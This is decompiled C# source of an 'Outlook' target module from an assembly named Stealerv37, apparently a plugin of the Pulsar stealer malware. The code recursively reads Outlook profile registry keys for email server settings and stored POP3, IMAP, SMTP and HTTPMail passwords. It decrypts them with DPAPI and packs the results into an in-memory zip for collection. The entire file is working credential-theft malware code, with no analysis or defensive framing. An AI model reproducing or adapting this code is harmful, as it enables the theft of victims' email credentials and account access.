// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Outlook
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Outlook : ITarget
{
  private static readonly Regex MailAddressRx = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$", RegexOptions.Compiled);
  private static readonly Regex HostnameRx = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$", RegexOptions.Compiled);
  private static readonly string[] RegistryRoots = new string[4]
  {
    "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
  };
  private static readonly string[] KeysToCheck = new string[28]
  {
    "SMTP Email Address",
    "SMTP Server",
    "POP3 Server",
    "POP3 User Name",
    "SMTP User Name",
    "NNTP Email Address",
    "NNTP User Name",
    "NNTP Server",
    "IMAP Server",
    "IMAP User Name",
    "Email",
    "HTTP User",
    "HTTP Server URL",
    "POP3 User",
    "IMAP User",
    "HTTPMail User Name",
    "HTTPMail Server",
    "SMTP User",
    "POP3 Password2",
    "IMAP Password2",
    "NNTP Password2",
    "HTTPMail Password2",
    "SMTP Password2",
    "POP3 Password",
    "IMAP Password",
    "NNTP Password",
    "HTTPMail Password",
    "SMTP Password"
  };

  public void Collect(InMemoryZip zip, Counter counter)
  {
    StringBuilder stringBuilder = new StringBuilder();
    foreach (string registryRoot in Outlook.RegistryRoots)
      stringBuilder.Append(this.ReadRegistryTree(registryRoot));
    if (stringBuilder.Length == 0)
      return;
    string entryPath = Path.Combine(nameof (Outlook), "Outlook.txt");
    zip.AddTextFile(entryPath, stringBuilder.ToString());
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Outlook);
    foreach (string registryRoot in Outlook.RegistryRoots)
      counterApplications.Files.Add($"{registryRoot} => {entryPath}");
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);
  }

  private string ReadRegistryTree(string rootPath)
  {
    StringBuilder stringBuilder = new StringBuilder();
    Stack<string> stringStack = new Stack<string>();
    stringStack.Push(rootPath);
    while (stringStack.Count > 0)
    {
      string str1 = stringStack.Pop();
      using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(str1, false))
      {
        if (registryKey != null)
        {
          foreach (string str2 in Outlook.KeysToCheck)
          {
            object raw = registryKey.GetValue(str2);
            if (raw != null)
            {
              string str3 = this.FormatValue(str2, raw);
              if (!string.IsNullOrEmpty(str3))
                stringBuilder.AppendLine(str3);
            }
          }
          foreach (string subKeyName in registryKey.GetSubKeyNames())
          {
            try
            {
              stringStack.Push(Path.Combine(str1, subKeyName));
            }
            catch
            {
            }
          }
        }
      }
    }
    if (stringBuilder.Length > 0)
      stringBuilder.AppendLine();
    return stringBuilder.ToString();
  }

  private string FormatValue(string valueName, object raw)
  {
    if (raw is byte[] numArray)
    {
      string str1 = Outlook.DecryptValue(numArray);
      if (!string.IsNullOrEmpty(str1))
        return $"{valueName}: {str1}";
      try
      {
        string str2 = Encoding.UTF8.GetString(numArray).Replace("\0", "");
        if (!string.IsNullOrWhiteSpace(str2))
          return $"{valueName}: {str2}";
      }
      catch
      {
      }
      return (string) null;
    }
    string input = raw.ToString();
    if (string.IsNullOrWhiteSpace(input))
      return (string) null;
    if (!Outlook.HostnameRx.IsMatch(input))
      Outlook.MailAddressRx.IsMatch(input);
    return $"{valueName}: {input}";
  }

  private static string DecryptValue(byte[] encrypted)
  {
    if (encrypted != null)
    {
      if (encrypted.Length > 1)
      {
        try
        {
          byte[] numArray = new byte[encrypted.Length - 1];
          Buffer.BlockCopy((Array) encrypted, 1, (Array) numArray, 0, numArray.Length);
          byte[] bytes = DpApi.Decrypt(numArray);
          return bytes == null || bytes.Length == 0 ? (string) null : Encoding.UTF8.GetString(bytes).TrimEnd(new char[1]);
        }
        catch
        {
          return (string) null;
        }
      }
    }
    return (string) null;
  }
}
